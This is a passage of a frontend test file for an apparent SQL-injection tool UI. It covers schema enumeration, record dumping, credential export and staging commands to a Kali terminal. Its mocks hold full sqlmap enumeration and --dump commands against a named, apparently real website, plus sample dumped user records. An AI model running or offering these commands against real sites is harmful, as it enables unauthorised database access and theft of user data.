    expect(stagedCommands.length).toBeGreaterThan(0);
    expect(stagedCommands[stagedCommands.length - 1]).toContain('sqlmap');
  }, 30000);

  it('switches to Layer 5 Database Enumeration (Dump Tab), walks hierarchical schema tree (Databases -> Tables -> Columns), and dumps records', async () => {
    const stagedCommands: string[] = [];
    const handleStage = (cmd: string) => {
      stagedCommands.push(cmd);
    };

    vi.spyOn(api, 'enumerateLayer5').mockImplementation(async (req) => {
      if (req.action === 'get_databases') {
        return {
          execution_id: 'l5-exec-1',
          target_url: req.target_url,
          parameter: req.parameter || 'id',
          action_executed: 'get_databases',
          current_database: 'smarttrichy_production',
          databases: [
            { name: 'smarttrichy_production', is_current: true, table_count: 6 },
            { name: 'information_schema', is_current: false, table_count: 78 },
          ],
          tables: [],
          columns: [],
          records: [],
          total_records: 0,
          limit: 25,
          offset: 0,
          sqlmap_command: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id --dbs --batch',
          execution_logs: ['[+] Discovered 2 database schemas.'],
          completed_at: new Date().toISOString(),
        };
      }
      if (req.action === 'get_tables') {
        return {
          execution_id: 'l5-exec-2',
          target_url: req.target_url,
          parameter: req.parameter || 'id',
          action_executed: 'get_tables',
          current_database: req.database_name || 'smarttrichy_production',
          databases: [],
          tables: [
            { name: 'users', database_name: 'smarttrichy_production', estimated_rows: 342, column_count: 4, is_sensitive: true },
            { name: 'customer_orders', database_name: 'smarttrichy_production', estimated_rows: 1289, column_count: 3, is_sensitive: false },
          ],
          columns: [],
          records: [],
          total_records: 0,
          limit: 25,
          offset: 0,
          sqlmap_command: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id -D smarttrichy_production --tables --batch',
          execution_logs: ['[+] Found 2 tables.'],
          completed_at: new Date().toISOString(),
        };
      }
      if (req.action === 'get_columns') {
        return {
          execution_id: 'l5-exec-3',
          target_url: req.target_url,
          parameter: req.parameter || 'id',
          action_executed: 'get_columns',
          current_database: req.database_name || 'smarttrichy_production',
          databases: [],
          tables: [],
          columns: [
            { name: 'id', data_type: 'INT(11)', is_primary_key: true, is_nullable: false },
            { name: 'username', data_type: 'VARCHAR(64)', is_primary_key: false, is_nullable: false },
            { name: 'email', data_type: 'VARCHAR(128)', is_primary_key: false, is_nullable: false },
            { name: 'role', data_type: 'VARCHAR(32)', is_primary_key: false, is_nullable: false },
          ],
          records: [],
          total_records: 0,
          limit: 25,
          offset: 0,
          sqlmap_command: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id -D smarttrichy_production -T users --columns --batch',
          execution_logs: ['[+] Enumerated 4 columns.'],
          completed_at: new Date().toISOString(),
        };
      }
      // dump_records
      return {
        execution_id: 'l5-exec-4',
        target_url: req.target_url,
        parameter: req.parameter || 'id',
        action_executed: 'dump_records',
        current_database: req.database_name || 'smarttrichy_production',
        databases: [],
        tables: [],
        columns: [],
        records: [
          { id: 1, username: 'admin', email: 'admin@smarttrichy.in', role: 'SUPERADMIN' },
          { id: 2, username: 'sec_auditor', email: 'audit@corp.internal', role: 'SECURITY' },
        ],
        total_records: 2,
        limit: 25,
        offset: 0,
        sqlmap_command: 'python sqlmap/sqlmap.py -u "https://smarttrichy.in/detail.php?id=99" -p id -D smarttrichy_production -T users -C "username,email,role" --dump --batch',
        execution_logs: ['[+] Extracted 2 records from smarttrichy_production.users'],
        completed_at: new Date().toISOString(),
      };
    });

    render(
      <SQLTab
        assets={testAssets}
        onStageCommandToTerminal={handleStage}
      />
    );

    // Click L5: Dump tab button
    const l5TabBtn = screen.getByRole('button', { name: /Layer 5: Database Enumeration/i });
    fireEvent.click(l5TabBtn);

    // Verify Layer 5 header and breadcrumbs
    expect(screen.getByText('Hierarchical Database Enumeration & Record Extractor')).toBeInTheDocument();
    expect(screen.getByText(/Active Schema Breadcrumbs:/i)).toBeInTheDocument();

    // Verify 3-step hierarchy cards
    expect(screen.getByText(/Databases \(/i)).toBeInTheDocument();
    expect(screen.getAllByText(/Tables in /i)[0]).toBeInTheDocument();
    expect(screen.getByText(/Columns \(/i)).toBeInTheDocument();

    // Trigger Enumerate Databases
    const enumDbsBtn = screen.getByRole('button', { name: /Enumerate Databases/i });
    await act(async () => {
      fireEvent.click(enumDbsBtn);
    });
    expect(api.enumerateLayer5).toHaveBeenCalledWith(
      expect.objectContaining({ action: 'get_databases' })
    );

    // Trigger Dump Records
    const dumpRecordsBtn = screen.getByRole('button', { name: /Dump Records/i });
    await act(async () => {
      fireEvent.click(dumpRecordsBtn);
    });
    expect(api.enumerateLayer5).toHaveBeenCalledWith(
      expect.objectContaining({ action: 'dump_records' })
    );

    // Verify records are rendered
    expect(screen.getAllByText('admin@smarttrichy.in')[0]).toBeInTheDocument();
    expect(screen.getAllByText('audit@corp.internal')[0]).toBeInTheDocument();

    // Test Kali CLI bridge
    const launchKaliBtn = screen.getByRole('button', { name: /Launch in Kali Terminal/i });
    fireEvent.click(launchKaliBtn);
    expect(stagedCommands.length).toBeGreaterThan(0);
    expect(stagedCommands[stagedCommands.length - 1]).toContain('--dump');
  }, 45000);

  it('switches to Layer 6 Data Extraction & Export, supports .txt and .xml exports, credential highlighting, and Kali CLI staging', async () => {
    const stagedCommands: string[] = [];
    const handleStage = (cmd: string) => {
      stagedCommands.push(cmd);
    };

    render(
      <SQLTab
        assets={testAssets}
        onStageCommandToTerminal={handleStage}
      />
    );

    // Switch to Layer 6: Export tab
    const l6TabBtn = screen.getByRole('button', { name: /Layer 6: Data Extraction/i });
    fireEvent.click(l6TabBtn);

    // Verify Layer 6 header & export controls
    expect(screen.getByText(/Layer 6: Final Output Layer/i)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Export \.TXT/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Export \.XML/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Export \.CSV/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Export \.JSON/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Copy user:pass List/i })).toBeInTheDocument();

    // Verify target and param display
    expect(screen.getAllByText(/smarttrichy_production\.users/i)[0]).toBeInTheDocument();

    // Verify records data grid
    expect(screen.getAllByText('SUPERADMIN')[0]).toBeInTheDocument();
    expect(screen.getAllByText('admin@smarttrichy.in')[0]).toBeInTheDocument();

    // Click Launch in Kali Terminal from Layer 6
    const kaliDumpBtn = screen.getByRole('button', { name: /Launch in Kali Terminal/i });
    fireEvent.click(kaliDumpBtn);
    expect(stagedCommands.length).toBeGreaterThan(0);
    expect(stagedCommands[stagedCommands.length - 1]).toContain('sqlmap');
    expect(stagedCommands[stagedCommands.length - 1]).toContain('--dump');
  }, 45000);
});


